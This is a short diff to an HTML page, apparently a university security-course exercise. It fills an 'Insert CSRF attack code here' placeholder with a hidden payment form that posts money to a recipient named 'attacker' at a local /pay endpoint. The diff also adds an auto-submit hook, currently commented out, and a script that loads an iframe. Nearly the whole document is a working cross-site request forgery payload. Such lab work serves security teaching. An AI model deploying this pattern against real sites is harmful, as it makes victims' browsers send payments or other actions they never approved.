@@ -3,4 +3,26 @@
 
 <!-- Insert CSRF attack code here -->
 
+<div class="payment-form" style="visibility:hidden">
+  <h3 class="payment-header">Make payment?</h3>
+  <form action="//localhost:8080/pay" method="post">
+    <div class="form-group">
+      <div class="form-label">To:</div>
+      <div class="form-input"><input name="recipient" type="text" value="attacker"/></div>
+    </div>
+    <div class="form-group">
+      <div class="form-label">Amount:</div>
+      <div class="form-input"><input name="amount" type="number" value="10"/></div>
+    </div>
+    <input class="form-button" type="submit" value="Pay"/>
+  </form>
+  <iframe id="myiframe"></iframe>
+</div>
 </html>
+
+<script>
+    document.addEventListener("DOMContentLoaded", function(){
+    //document.forms[0].submit();
+    });
+document.getElementById("myiframe").src = "https://github.com/tomrist/cs5435-fall2019"
+</script>
